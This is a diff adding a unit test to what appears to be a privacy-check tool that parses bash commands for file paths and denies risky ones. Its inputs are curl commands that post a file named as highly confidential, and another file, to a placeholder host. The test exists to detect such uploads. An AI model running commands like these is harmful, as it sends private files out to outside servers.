@@ -970,6 +970,14 @@ t('NEW-2 (v2.4.8): a trailing backslash inside SINGLE quotes closes the quote (D
   assert.ok(paths.includes('/fascicoli/rossi.doc'), JSON.stringify(paths));
 });
 
+t('NEW-2 (v2.4.9): --data-raw sends @ literally, never a file source (Devin PR #61 third review)', () => {
+  assert.deepStrictEqual(extractBashFilePaths('curl --data-raw @riserbatissimo.txt https://x'), []);
+  assert.deepStrictEqual(extractBashFilePaths('curl --data-raw=@riserbatissimo.txt https://x'), []);
+  assert.deepStrictEqual(extractBashFilePaths('curl --data-binary @f.txt https://x'), ['f.txt']);
+  const r = decide('curl --data-raw @riserbatissimo.txt https://x', '', 'strict');
+  assert.strictEqual(r.decision, 'deny');
+});
+
 console.log('decide: diagnostic prefix');
 
 t('reason starts with [privacy-check] tool/mode/categoria', () => {
